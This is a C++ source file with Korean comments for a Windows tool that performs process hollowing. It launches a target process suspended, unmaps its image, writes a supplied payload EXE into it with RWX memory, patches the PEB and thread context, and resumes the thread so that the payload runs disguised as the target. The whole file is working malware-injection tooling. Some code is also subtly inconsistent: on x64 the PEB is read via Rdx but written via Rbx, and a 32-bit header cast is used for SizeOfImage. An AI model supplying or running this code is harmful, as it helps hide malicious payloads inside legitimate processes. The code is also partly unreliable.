#include <windows.h>
#include <winternl.h>
#include <tchar.h>
#include <iostream>

// NtUnmapViewOfSection 함수의 함수 포인터 타입 정의
typedef NTSTATUS(WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL ProcessHollowing(LPCTSTR szTargetProc, LPCTSTR szPayload)
{
    // CreateProcess 호출 시 사용되는 구조체들
    STARTUPINFO si = { 0 };         // STARTUPINFO: 프로세스 시작 정보를 담음
    PROCESS_INFORMATION pi = { 0 };   // PROCESS_INFORMATION: 생성된 프로세스 및 스레드 핸들 정보
    CONTEXT ctx;                    // 스레드의 레지스터 및 상태 정보(EIP/RIP 등)
    LPVOID pRemoteImage = NULL;     // 대상 프로세스에 페이로드가 로드될 메모리 영역 시작 주소
    PBYTE pLocalImage = NULL;       // 파일에서 읽어들인 페이로드 이미지 저장 버퍼

#ifdef _WIN64
    // x64에서는 ImageBase가 64비트 값
    DWORD64 dwImageBase = 0; // PE 헤더에 명시된 Preferred Base Address
#else
    DWORD dwImageBase = 0;
#endif

    pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;

    // STARTUPINFO의 cb 필드는 반드시 초기화해야 함
    si.cb = sizeof(STARTUPINFO);

    // 1. 대상 프로세스를 CREATE_SUSPENDED 상태로 생성
    if (!CreateProcess(NULL, (LPWSTR)szTargetProc, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        std::wcerr << L"CreateProcess failed: " << GetLastError() << std::endl;
        return FALSE;
    }

    // 2. 페이로드(EXE) 파일을 읽기 전용으로 open하여 메모리에 로드
    HANDLE hFile = CreateFile(szPayload, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to open payload: " << GetLastError() << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    // 파일 크기 확인
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0)
    {
        std::wcerr << L"Invalid payload file size." << std::endl;
        CloseHandle(hFile);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    // 파일 내용을 동적 할당 버퍼에 읽어옴
    pLocalImage = new BYTE[dwFileSize];
    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pLocalImage, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        std::wcerr << L"Failed to read payload file." << std::endl;
        CloseHandle(hFile);
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    CloseHandle(hFile);

    // 3. ntdll.dll에서 NtUnmapViewOfSection 함수를 가져옴
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!hNtdll)
    {
        std::wcerr << L"Failed to get handle for ntdll.dll." << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection)
    {
        std::wcerr << L"Failed to get NtUnmapViewOfSection address." << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 4. 대상 프로세스의 스레드 컨텍스트를 가져옴 (컨텍스트 플래그: 전체 레지스터 정보)
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx))
    {
        std::wcerr << L"GetThreadContext failed: " << GetLastError() << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 5. 페이로드의 PE 헤더 파싱
    // DOS 헤더: 파일 시작 부분의 "MZ" 서명을 확인
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pLocalImage;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        std::wcerr << L"Invalid DOS signature in payload." << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    // NT 헤더: DOS 헤더의 e_lfanew 필드를 통해 위치 파악 ("PE\0\0" 서명)
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pLocalImage + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        std::wcerr << L"Invalid NT signature in payload." << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
#ifdef _WIN64
    dwImageBase = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.ImageBase;
#else
    dwImageBase = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.ImageBase;
#endif

    // 6. 대상 프로세스의 PEB에서 현재 ImageBase를 읽어옴  
    // 32비트: PEB의 ImageBaseAddress는 (PEB 주소 + 0x8), 64비트: 보통 (PEB 주소 + 0x10)
    PVOID remoteBase = NULL;
#ifndef _WIN64
    if (!ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8),
                           &remoteBase, sizeof(PVOID), NULL))
    {
        std::wcerr << L"ReadProcessMemory (PEB) failed: " << GetLastError() << std::endl;
    }
#else
    if (!ReadProcessMemory(pi.hProcess, (PVOID)((DWORD64)ctx.Rdx + 0x10),
                           &remoteBase, sizeof(PVOID), NULL))
    {
        std::wcerr << L"ReadProcessMemory (PEB x64) failed: " << GetLastError() << std::endl;
    }
#endif

    // 7. 만약 원격 프로세스의 ImageBase가 페이로드의 Preferred Base와 같다면,
    //    기존 이미지를 NtUnmapViewOfSection을 통해 언매핑
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
    if (remoteBase && ((SIZE_T)remoteBase == dwImageBase))
    {
        NtUnmap(pi.hProcess, remoteBase);
    }

    // 8. 대상 프로세스에 페이로드의 SizeOfImage만큼 메모리 할당 (Preferred Base로 할당 시도)
    LPVOID pAllocatedImage = VirtualAllocEx(pi.hProcess, (LPVOID)dwImageBase,
                        ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.SizeOfImage, 
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedImage)
    {
        std::wcerr << L"VirtualAllocEx failed: " << GetLastError() << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 9. 대상 프로세스에 페이로드의 PE 헤더와 섹션 데이터를 기록
    // 먼저 전체 헤더(SizeOfHeaders)부터 기록
    SIZE_T headersSize = pNtHeaders->OptionalHeader.SizeOfHeaders;
    if (!WriteProcessMemory(pi.hProcess, pAllocatedImage, pLocalImage, headersSize, NULL))
    {
        std::wcerr << L"WriteProcessMemory (headers) failed: " << GetLastError() << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }
    // 이어서 각 섹션 데이터를 해당 가상 주소에 기록
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID dest = (LPBYTE)pAllocatedImage + pSection[i].VirtualAddress;
        LPVOID src  = pLocalImage + pSection[i].PointerToRawData;
        if (!WriteProcessMemory(pi.hProcess, dest, src, pSection[i].SizeOfRawData, NULL))
        {
            std::wcerr << L"WriteProcessMemory (section " << i << L") failed: " << GetLastError() << std::endl;
            delete[] pLocalImage;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return FALSE;
        }
    }

    // 10. 대상 프로세스의 PEB 업데이트: PEB의 ImageBaseAddress를 새로 할당한 이미지 주소로 기록  
    // 32비트: (PEB 주소 + 0x8), 64비트: (PEB 주소 + 0x10)
#ifndef _WIN64
    {
        PVOID newBase = pAllocatedImage;
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &newBase, sizeof(newBase), NULL);
    }
#else
    {
        PVOID newBase = pAllocatedImage;
        WriteProcessMemory(pi.hProcess, (PVOID)((DWORD64)ctx.Rbx + 0x10), &newBase, sizeof(newBase), NULL);
    }
#endif

    // 11. 스레드 컨텍스트 수정: 새 EntryPoint = pAllocatedImage + AddressOfEntryPoint (RVA)
#ifndef _WIN64
    DWORD entryPointRVA = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.AddressOfEntryPoint;
    ctx.Eip = (DWORD)((LPBYTE)pAllocatedImage + entryPointRVA);
#else
    DWORD64 entryPointRVA = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.AddressOfEntryPoint;
    ctx.Rip = (DWORD64)((LPBYTE)pAllocatedImage + entryPointRVA);
#endif

    if (!SetThreadContext(pi.hThread, &ctx))
    {
        std::wcerr << L"SetThreadContext failed: " << GetLastError() << std::endl;
        delete[] pLocalImage;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 12. 대상 프로세스의 스레드를 재개하여, 주입한 페이로드가 실행되도록 함
    ResumeThread(pi.hThread);

    // 정리: 동적 할당한 버퍼 및 핸들 해제
    delete[] pLocalImage;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::wcout << L"Process Hollowing Success!" << std::endl;
    return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
    if (argc != 3)
    {
        std::wcout << L"Usage: " << argv[0] << L" <Target Process> <Payload>" << std::endl;
        return 1;
    }
    if (!ProcessHollowing(argv[1], argv[2]))
        std::wcerr << L"Process hollowing failed." << std::endl;
    else
        std::wcout << L"Process hollowing executed successfully." << std::endl;
    return 0;
}
